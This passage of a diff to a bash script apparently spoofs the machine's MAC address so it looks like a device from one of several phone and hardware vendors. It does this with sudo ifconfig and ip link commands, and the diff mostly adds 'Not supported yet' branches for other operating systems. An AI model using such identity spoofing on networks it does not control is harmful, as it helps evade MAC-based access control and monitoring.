+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 38:2D:E8:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+elif [[ $_system == "SunOS" ]]; then
 
+  printf "$RED Not supported yet$NC\n"
 
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "OS/390" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
 
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -936,7 +1092,11 @@ _lg(){ #morph
 
   _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "AIX" ]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "Darwin" ]]; then #tw
 
   _off
   sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -950,7 +1110,7 @@ _lg(){ #morph
   printf "$WHITE LG :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
   fi
 
-  elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -964,25 +1124,58 @@ _lg(){ #morph
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-  elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
     sudo ip link set dev enp0s3 down
     sudo ip link set dev enp0s3 address $(echo 2C:54:CF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
     sudo ip link set dev enp0s3 up
 
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then #tw
 
     ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
   else
 
-   printf "Not available on this system\n"
+   printf "$RED Not supported sys$NC\n"
 
   fi
 
@@ -999,7 +1192,11 @@ _apple(){ #morph
 
   _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "AIX" ]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "Darwin" ]]; then #tw
 
   #printf "$YELLOW DEBUG ->$BLUE Darwin morphing$NC\n"
 
@@ -1015,7 +1212,7 @@ _apple(){ #morph
   printf "$WHITE Apple :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
   fi
 
-  elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
   #printf "$YELLOW DEBUG ->$BLUE Linux morphing$NC\n"
 
@@ -1038,21 +1235,54 @@ _apple(){ #morph
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-  elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
     sudo ip link set dev enp0s3 down
     sudo ip link set dev enp0s3 address $(echo DC:A9:04:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
     sudo ip link set dev enp0s3 up
 
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then #tw
 
     ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
 
   else
 
@@ -1074,7 +1304,11 @@ _oppo(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 #printf "$YELLOW DEBUG ->$BLUE Darwin morphing$NC\n"
 
@@ -1090,7 +1324,7 @@ else
 printf "$WHITE Oppo :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 #printf "$YELLOW DEBUG ->$BLUE Linux morphing$NC\n"
 
@@ -1112,21 +1346,54 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 50:29:F5:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
+
+
+elif [[ $_system == "SunOS" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "OS/390" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
 
 else
 
@@ -1141,7 +1408,11 @@ _one_plus(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1155,7 +1426,7 @@ else
 printf "$WHITE One Plus :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo C0:EE:FB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1169,25 +1440,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo C0:EE:FB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo C0:EE:FB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+elif [[ $_system == "SunOS" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "OS/390" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1201,7 +1505,11 @@ _codes=("48:AD:08" "2C:AB:00" "00:E0:FC" "24:DF:6A" "00:9A:CD" "80:38:BC" "D4:40
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1215,7 +1523,7 @@ else
 printf "$WHITE Huawei :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1230,25 +1538,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 78:F5:FD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1260,7 +1601,11 @@ _xperia(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1274,7 +1619,7 @@ else
 printf "$WHITE Xperia :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 1C:7B:21:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1288,25 +1633,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 1C:7B:21:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo 1C:7B:21:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1317,7 +1695,11 @@ _yota(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1331,7 +1713,7 @@ else
 printf "$WHITE Yota :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 28:C6:71:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1346,25 +1728,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 28:C6:71:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo 28:C6:71:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1376,7 +1791,11 @@ _lumia(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1390,7 +1809,7 @@ else
 printf "$WHITE Lumia :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 38:F2:3E:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1404,25 +1823,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 38:F2:3E:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo 38:F2:3E:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1436,7 +1888,11 @@ _nokia(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1450,7 +1906,7 @@ else
 printf "$WHITE Nokia :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1465,25 +1921,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo A4:81:EE:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1499,7 +1988,11 @@ _htc(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1513,7 +2006,7 @@ else
 printf "$WHITE HTC :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1527,25 +2020,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 80:7A:BF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1560,7 +2086,11 @@ _xiaomi(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1574,7 +2104,7 @@ else
 printf "$WHITE Xiaomi :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1588,25 +2118,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
